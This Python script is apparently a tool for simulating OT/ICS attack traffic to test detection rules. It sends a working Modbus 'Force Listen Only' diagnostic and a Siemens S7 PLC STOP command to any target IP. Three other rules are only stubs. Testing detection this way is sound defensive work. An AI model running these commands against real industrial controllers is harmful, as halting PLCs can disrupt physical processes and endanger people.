#!/usr/bin/env python3

import argparse
import sys
import base64
import subprocess

# Import necessary libraries for OT protocols
try:
    from pymodbus.client.sync import ModbusTcpClient
except ImportError:
    print("[!] pymodbus library is not installed. Please install it using 'pip install pymodbus'.")
    sys.exit(1)

try:
    import snap7
except ImportError:
    print("[!] snap7 library is not installed. Please install it using 'pip install python-snap7'.")
    sys.exit(1)

# Define rule descriptions
rule_descriptions = {
    1: "Modbus Diagnostic - Force Listen Only Mode",
    2: "Siemens S7 PLC STOP Command",
    3: "Schneider Electric UMAS Protocol STOP Command",
    4: "DNP3 Warm Restart Command",
    5: "CODESYS Protocol Login Attempt",
}

# Display available rules
description_text = "CPSDR Simulation Script (OT/ICS)\n\nSupported Rules:\n"
for number, desc in rule_descriptions.items():
    description_text += f"  {number}: {desc}\n"

# Argument parser setup
parser = argparse.ArgumentParser(
    description=description_text,
    formatter_class=argparse.RawTextHelpFormatter
)
parser.add_argument("-o", "--option", required=True, type=int, help="Rule number to simulate (e.g., 1, 2, 3)")
parser.add_argument("-t", "--target", required=True, help="Target IP or hostname")
parser.add_argument("-p", "--port", type=int, help="Target port (if different from default)")
parser.add_argument("-u", "--username", help="Username for authentication (if required)")
parser.add_argument("-w", "--password", help="Password for authentication (if required)")

args = parser.parse_args()

# Simulation functions
def simulate_modbus_force_listen_only(target, port=502):
    print(f"[+] Simulating Modbus Force Listen Only Mode on {target}:{port}...")
    client = ModbusTcpClient(target, port=port)
    if client.connect():
        try:
            # Function code 8 (Diagnostic), Sub-function 4 (Force Listen Only Mode)
            result = client.execute(
                function_code=8,
                sub_function=4,
                data=0
            )
            print("[+] Modbus command sent successfully.")
        except Exception as e:
            print(f"[!] Error sending Modbus command: {e}")
        finally:
            client.close()
    else:
        print("[!] Unable to connect to Modbus server.")

def simulate_siemens_s7_stop_command(target, port=102):
    print(f"[+] Simulating Siemens S7 PLC STOP Command on {target}:{port}...")
    try:
        client = snap7.client.Client()
        client.connect(target, 0, 1)
        client.plc_stop()
        print("[+] S7 STOP command sent successfully.")
        client.disconnect()
    except Exception as e:
        print(f"[!] Error sending S7 STOP command: {e}")

def simulate_schneider_umas_stop_command(target, port=502):
    print(f"[+] Simulating Schneider Electric UMAS Protocol STOP Command on {target}:{port}...")
    # Placeholder for UMAS STOP command simulation
    print("[!] UMAS STOP command simulation is not implemented in this script.")

def simulate_dnp3_warm_restart(target, port=20000):
    print(f"[+] Simulating DNP3 Warm Restart Command on {target}:{port}...")
    # Placeholder for DNP3 Warm Restart simulation
    print("[!] DNP3 Warm Restart simulation is not implemented in this script.")

def simulate_codesys_login_attempt(target, port=2455, username=None, password=None):
    print(f"[+] Simulating CODESYS Protocol Login Attempt on {target}:{port}...")
    # Placeholder for CODESYS login attempt simulation
    print("[!] CODESYS login attempt simulation is not implemented in this script.")

# Map rule numbers to simulation functions
simulation_functions = {
    1: simulate_modbus_force_listen_only,
    2: simulate_siemens_s7_stop_command,
    3: simulate_schneider_umas_stop_command,
    4: simulate_dnp3_warm_restart,
    5: simulate_codesys_login_attempt,
}

# Execute the selected simulation
if args.option in simulation_functions:
    if args.option == 1:
        simulate_modbus_force_listen_only(args.target, args.port or 502)
    elif args.option == 2:
        simulate_siemens_s7_stop_command(args.target, args.port or 102)
    elif args.option == 3:
        simulate_schneider_umas_stop_command(args.target, args.port or 502)
    elif args.option == 4:
        simulate_dnp3_warm_restart(args.target, args.port or 20000)
    elif args.option == 5:
        simulate_codesys_login_attempt(args.target, args.port or 2455, args.username, args.password)
else:
    print(f"[!] Rule ID {args.option} is not supported in this script.")
    sys.exit(1)
